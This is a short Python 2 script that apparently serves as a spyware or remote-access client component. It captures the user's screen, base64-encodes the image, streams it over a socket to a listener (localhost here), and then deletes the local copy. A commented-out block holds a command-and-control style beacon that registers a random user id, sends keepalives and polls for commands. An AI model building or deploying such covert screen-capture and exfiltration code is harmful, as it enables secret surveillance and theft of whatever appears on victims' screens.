import socket
import time
import random
import ImageGrab
from PIL import Image
import uuid
import os
import base64

global userid

def snap_handler(userid):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("127.0.0.1", 10000))
	for i in xrange(1):
		print 'Getting snap num {0}'.format(i)
		snapshot = ImageGrab.grab()
		save_path = "C:\\Users\\user\\MySnapshot.jpg"
		snapshot.save(save_path)
		snapid = str(uuid.uuid4())
		print 'got snap, snapid: ' + snapid
		# Send
		f = open(save_path, 'rb')
		while True:
			print 'Reading from snap'
			raw_data = f.read(100000)
			if not raw_data:
				print 'breaking'
				break
			encoded_data = base64.b64encode(raw_data)
			msg = "{0},{1},{2}".format(userid, snapid, encoded_data)
			s.send(msg)
			time.sleep(0.1)
			print 'Sent snap'

		# finish, remove the file
		f.close()
		os.remove(save_path)

snap_handler(raw_input())

"""
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 8002))
userid = random.randint(1,10001)
s.send(str(userid))
s.recv(1024)
while True:
	s.send("KeepAlive!")
	time.sleep(5)
	req = s.recv(1024)
	print 'Do request: ' + req
	if req == 'hey':
		hey()
	elif req == 'nojobs':
		print 'no jobs for me!'
"""